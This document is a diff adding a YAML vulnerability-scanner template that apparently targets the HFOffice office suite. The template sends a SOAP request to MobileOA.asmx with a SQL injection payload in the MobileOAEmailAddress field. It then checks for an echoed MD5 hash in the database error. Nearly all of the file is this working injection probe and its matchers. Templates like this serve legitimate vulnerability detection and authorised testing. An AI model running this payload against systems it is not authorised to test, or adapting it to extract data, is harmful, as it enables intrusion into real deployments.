@@ -1,0 +1,41 @@
+id: poc-yaml-hfoffice-getcommbooktreelist-sqli
+info:
+  name: 红帆HFOffice GetCommBookTreeList SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: hfoffice
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - raw:
+      - |
+        POST /ioffice/prg/set/wss/MobileOA.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetCommBookTreeList"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetCommBookTreeList xmlns="http://tempuri.org/">
+              <MobileOAEmailAddress>' and 1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--</MobileOAEmailAddress>
+            </GetCommBookTreeList>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "转换成数据类型"
+          - "SqlException"
+      - type: regex
+        regex:
+          - "(?i)text/xml"
+        part: header
